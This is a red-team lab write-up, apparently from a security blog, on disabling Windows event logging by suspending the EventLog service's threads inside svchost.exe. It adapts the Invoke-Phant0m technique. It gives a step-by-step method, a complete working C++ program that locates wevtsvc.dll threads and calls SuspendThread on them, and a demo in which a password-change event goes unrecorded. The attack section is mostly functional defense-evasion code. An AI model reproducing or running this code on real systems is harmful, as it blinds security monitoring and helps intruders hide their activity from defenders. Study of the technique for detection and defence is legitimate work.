# Disabling Windows Event Logs by Suspending EventLog Service Threads

## Disabling Windows Event Logs by Suspending EventLog Service Threads

This lab was inspired by an old post [Phant0m: Killing Windows Event Log](https://artofpwn.com/phant0m-killing-windows-event-log.html) by [@hlldz](https://twitter.com/hlldz) where he introduced a powershell tool [Invoke-Phant0m](https://github.com/hlldz/Invoke-Phant0m), which disables Windows EventLog service by killing its threads hosted by the svchost.exe.

The purpose of this quick lab is to understand some of the inner workings of Invoke-Phant0m. In particular, I wanted to play around with Windows APIs related to retrieving a process ID that hosts a given service, thread enumeration, mapping threads to a particular service (Windows Eventlog in this case) hosted in the svchost.exe and so on. This would give me a better understanding of how I can target specific threads when I need to, I thought.

{% hint style="info" %}
Although this lab was inspired by @hlldz' post, you will notice that we implemented the same technique in a slightly different way by levarging different Windows APIs.
{% endhint %}

### Overview

Windows event logs are handled by `EventLog` service that is hosted by svchost.exe.

If we list svchost processes, we see a number of those:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-MGT_0Rc1KNfhBBGSzdO%2F-MGTh_uWLU1hEeNPgvBZ%2Fimage.png?alt=media\&token=c5de7195-3bed-4af0-96e0-d9bb650a80c7)

From the above screenshot, it's not clear which process actually hosts the `EventLog` service, but if we keep inspecting `svchost.exe` processes one by one in Process Hacker, we will eventually find the process hosting the `EventLog` service, which in my case it is `svchost.exe` with pid 2196:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-MGT_0Rc1KNfhBBGSzdO%2F-MGTiR-kHqXA8-zDSdSk%2Fimage.png?alt=media\&token=673fce20-6888-4796-ab88-866d56b411e8)

Note that we can find out the PID of the process that is hosting `EventLog`:

```csharp
Get-WmiObject -Class win32_service -Filter "name = 'eventlog'" | select -exp ProcessId
```

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-MGT_0Rc1KNfhBBGSzdO%2F-MGTicSjmxd_M5Kai6dI%2Fimage.png?alt=media\&token=102e3f3c-e269-463f-b3d9-67f57d9793c3)

If we look into svchost.exe threads for `EventLog`, we see there are a couple of threads of interest as highlighted in blue:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-MGT_0Rc1KNfhBBGSzdO%2F-MGTjlxkYQahgZfYXmMK%2Fimage.png?alt=media\&token=cea1e340-376d-4e93-9b92-d7ecf0800d89)

Below shows that indeed, suspending the threas is enough to disable the EventLog service from registering any new events:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-MGTm51RpMTjEuD2yiki%2F-MGTpCoCEc40fWnXXJJK%2Fsuspended-threads-no-events.gif?alt=media\&token=2233ae9f-af68-4501-bdf0-3ff7a0498ba6)

Based on the above, the main goal of this lab is to hack some code to find these threads and simply suspend them and disable windows event logging this way.

{% hint style="warning" %}
Resuming threads will write out the events to the events log as if the threads had not been suspended in the first place.
{% endhint %}

### Code

Below is the code for the technique that at a high level works like this:

1. Open a handle to Service Control Manager with `OpenSCManagerA`
2. Open a handle to EventLog service with `OpenServiceA`
3. Retrieve svchost.exe (hosting EventLog) process ID with `QueryServiceStatusEx`
4. Open a handle to the svchost.exe process (from step 3)
5. Get a list of loaded modules loaded by svchost.exe `EnumProcessModules`
6. Loop through the list of `svchost` loaded modules, retrieved in step 5, find their names with `GetModuleBaseName` and find the base address of the module `wevtsvc.dll` - this is the module containing `EventLog` service inner-workings
7. Get `wevtsvc.dll` module info with `GetModuleInformation`. It will return a structure with module's start address and its image size - we will need these details later, when determiing if `EventLog` service thread's fall into wevtsvc.dll module's memory space
8. Enumerate all the threads inside svchost.exe with `Thread32First` and `Thread32Next`
9. For each thread from step 8, retrieve the thread's start address with `NtQueryInformationThread`
10. For each thread from step 8, check if the thread's start address belongs to the `wevtsvc.dll` memory space inside svchost.exe
11. If thread's start address is inside the `wevtsvc.dll` memory space, this is our victim thread and we suspend it with `SuspendThread`
12. `EventLog` service is now disabled

```cpp
#include <iostream>
#include <Windows.h>
#include <Psapi.h>
#include <TlHelp32.h>
#include <dbghelp.h>
#include <winternl.h>

#pragma comment(lib, "DbgHelp")

using myNtQueryInformationThread = NTSTATUS(NTAPI*)(
	IN HANDLE          ThreadHandle,
	IN THREADINFOCLASS ThreadInformationClass,
	OUT PVOID          ThreadInformation,
	IN ULONG           ThreadInformationLength,
	OUT PULONG         ReturnLength
	);

int main()
{
	HANDLE serviceProcessHandle;
	HANDLE snapshotHandle;
	HANDLE threadHandle;

	HMODULE modules[256] = {};
	SIZE_T modulesSize = sizeof(modules);
	DWORD modulesSizeNeeded = 0;
	DWORD moduleNameSize = 0;
	SIZE_T modulesCount = 0;
	WCHAR remoteModuleName[128] = {};
	HMODULE serviceModule = NULL;
	MODULEINFO serviceModuleInfo = {};
	DWORD_PTR threadStartAddress = 0;
	DWORD bytesNeeded = 0;

	myNtQueryInformationThread NtQueryInformationThread = (myNtQueryInformationThread)(GetProcAddress(GetModuleHandleA("ntdll"), "NtQueryInformationThread"));

	THREADENTRY32 threadEntry;
	threadEntry.dwSize = sizeof(THREADENTRY32);

	SC_HANDLE sc = OpenSCManagerA(".", NULL, MAXIMUM_ALLOWED);
	SC_HANDLE service = OpenServiceA(sc, "EventLog", MAXIMUM_ALLOWED);

	SERVICE_STATUS_PROCESS serviceStatusProcess = {};

	# Get PID of svchost.exe that hosts EventLog service
	QueryServiceStatusEx(service, SC_STATUS_PROCESS_INFO, (LPBYTE)&serviceStatusProcess, sizeof(serviceStatusProcess), &bytesNeeded);
	DWORD servicePID = serviceStatusProcess.dwProcessId;

	# Open handle to the svchost.exe
	serviceProcessHandle = OpenProcess(MAXIMUM_ALLOWED, FALSE, servicePID);
	snapshotHandle = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);

	# Get a list of modules loaded by svchost.exe
	EnumProcessModules(serviceProcessHandle, modules, modulesSize, &modulesSizeNeeded);
	modulesCount = modulesSizeNeeded / sizeof(HMODULE);
	for (size_t i = 0; i < modulesCount; i++)
	{
		serviceModule = modules[i];

		# Get loaded module's name
		GetModuleBaseName(serviceProcessHandle, serviceModule, remoteModuleName, sizeof(remoteModuleName));

		if (wcscmp(remoteModuleName, L"wevtsvc.dll") == 0)
		{
			printf("Windows EventLog module %S at %p\n\n", remoteModuleName, serviceModule);
			GetModuleInformation(serviceProcessHandle, serviceModule, &serviceModuleInfo, sizeof(MODULEINFO));
		}
	}

	# Enumerate threads
	Thread32First(snapshotHandle, &threadEntry);
	while (Thread32Next(snapshotHandle, &threadEntry))
	{
		if (threadEntry.th32OwnerProcessID == servicePID)
		{
			threadHandle = OpenThread(MAXIMUM_ALLOWED, FALSE, threadEntry.th32ThreadID);
			NtQueryInformationThread(threadHandle, (THREADINFOCLASS)0x9, &threadStartAddress, sizeof(DWORD_PTR), NULL);
			
			# Check if thread's start address is inside wevtsvc.dll memory range
			if (threadStartAddress >= (DWORD_PTR)serviceModuleInfo.lpBaseOfDll && threadStartAddress <= (DWORD_PTR)serviceModuleInfo.lpBaseOfDll + serviceModuleInfo.SizeOfImage)
			{
				printf("Suspending EventLog thread %d with start address %p\n", threadEntry.th32ThreadID, threadStartAddress);

				# Suspend EventLog service thread
				SuspendThread(threadHandle);
				Sleep(2000);
			}
		}
	}

	return 0;
}
```

### Demo

Below GIF illustrates:

* `net user ola ola` is executed and user's ola password is changed and an event `4724` logged at 6:55:30 PM
* 4 EventLog threads are suspended in svchost.exe (PID 2196)
* `net user ola ola` is executed again at 6:55:38 PM, but no new event `4724` is captured

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-MGiXjs1EPUkjz0Enqp4%2F-MGn_BEmbg2fRLAR_gMP%2Fdemo-suspending-eventlog-threads.gif?alt=media\&token=c79fb9c1-38a0-4472-be25-7c07dee4aea8)

### References
